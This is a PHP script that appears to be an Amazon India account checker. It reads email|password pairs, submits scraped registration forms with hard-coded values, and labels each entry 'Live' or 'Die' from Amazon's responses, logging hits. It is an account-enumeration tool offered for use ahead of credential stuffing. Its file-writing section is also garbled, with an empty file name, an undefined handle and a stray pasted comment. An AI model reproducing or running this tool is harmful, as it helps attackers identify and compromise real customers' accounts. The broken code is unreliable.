<?php
session_start();
error_reporting(0);

//pemisah eksekutor

$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$hasil = array();

if (!isset($format)) {
header('location: ./');
exit;
}
require 'class_curl.php';
if (isset($format)){
    
    // cek wrong
    if ($pisah[1] == '' || $pisah[1] == null) {
        die('{"error":-1,"msg":"<font color=aqua><b>UNKNOWN</b></font> | Unable to checking"}');
    }
    
    $curl = new curl();
    $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
    $curl->ssl(0, 2);
    
// pembuat kode nope acak

function kode_acak($n = 10) {
     $aKod = NULL;
     $kode = "0123456789"; // kode nya
   
  for ($i=0; $i<$n; $i++) {
     $acakAngka = rand(1, strlen($kode));
     $aKod .= substr($kode, $acakAngka, 1);
  }
   
  return $aKod;
  }
  
$api = kode_acak($n = 10);
    
// tempat url and https://www.amazon.in/ap/register/data

    $url = "https://www.amazon.in/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&prevRID=VH7QHE3P5GQFZCPTQNNT&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&prepopulatedLoginId=&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=inflex&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0";
    $page = $curl->get($url);

    if ($page) {
        
        $data = 'appActionToken='.getStr($page, '<input type="hidden" name="appActionToken" value="', '"').'&appAction=REGISTER&openid.return_to='.getStr($page, '<input type="hidden" name="openid.return_to" value="', '"').'&prevRID='.getStr($page, '<input type="hidden" name="prevRID" value="', '"').'&customerName=Sourav Gurjar&countryCode=US&email='.$api.'&secondaryLoginClaim='.$pisah[0].'&password=memeksi1919&metadata1=';
        $action = 'https://www.amazon.in/ap/register/';
        $page  = $curl->post($url, $data);



// hasil eksekusi

        if (inStr($page, "SMS with an OTP has been sent to your mobile number")) {
             $result['error'] = 2;
    $result['msg'] = '<b style="color:red;">Die</b> | '.$pisah[0].' | '.$pisah[1].' ';
    die(json_encode($result));
        } else if (inStr($page, "Please use another Email address.")) {
        $result['error'] = 0;
    $result['msg'] = '<b style="color:green;">Live</b> | '.$pisah[0].' | '.$pisah[1].' ./NBA ';
    $a = fopen('', 'a+');
fwrite($fp, '23');
fwrite($fp, '23');
fclose($fp);

// the content of 'data.txt' is now 123 and not 23!
      
      @fwrite($a, $result["msg"]."<br>");
      @fclose($a);
      die(json_encode($result));

        } else {
            die('{"error":-1,"msg":"<font color=aqua><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
        }
    } else {
        die('{"error":-1,"msg":"<font color=aqua><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].' | Unable To Connect"}');
    }
}
?>


